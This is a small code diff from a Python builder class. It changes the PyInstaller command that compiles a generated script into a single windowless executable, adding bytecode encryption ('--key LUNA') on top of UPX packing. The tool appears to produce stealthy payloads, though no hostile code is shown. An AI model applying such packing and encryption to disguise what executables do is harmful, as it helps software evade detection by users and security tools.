@@ -280,7 +280,7 @@ class Builder:
             icon = self.icon_name
         else:
             icon = "NONE"
-        os.system(f'python -m PyInstaller --onefile --noconsole --upx-dir=./upx -i {icon} --distpath ./ .\\{filename}.py')
+        os.system(f'python -m PyInstaller --onefile --noconsole --key LUNA --upx-dir=./upx -i {icon} --distpath ./ .\\{filename}.py')
         print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} Code compiled!{Fore.RESET}')
 
     def run(self, filename):
